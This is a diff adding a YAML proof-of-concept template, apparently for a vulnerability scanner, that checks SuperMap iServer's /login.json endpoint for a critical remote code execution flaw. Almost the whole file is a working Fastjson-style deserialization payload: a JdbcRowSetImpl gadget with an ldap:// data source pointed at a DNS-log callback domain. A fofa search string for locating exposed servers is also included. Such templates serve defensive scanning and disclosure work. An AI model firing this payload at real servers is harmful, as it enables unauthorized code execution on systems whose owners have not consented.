@@ -1,0 +1,23 @@
+id: poc-yaml-supermap-iser-login-json-rce
+info:
+  name: SuperMap iServer /login.json 命令执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: SuperMap-iServer
+  fofa: app="SuperMap-iServer"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /iserver/services/security/login.json
+  headers:
+    Content-Type: application/json;
+  data: "{\n\"rasdnd1\": {\n    \"@type\": \"java.lang.Class\", \n    \"val\": \"\
+    com.sun.rowset.JdbcRowSetImpl\"\n}, \n\"randfd2\": {\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\"\
+    , \n    \"dataSourceName\": \"ldap://{{.reverseDomain}}\", \n    \"autoCommit\"\
+    : true\n}\n}"
+  expression: "status_code == 200 && \nreverse.Verify()\n"
+transport: http
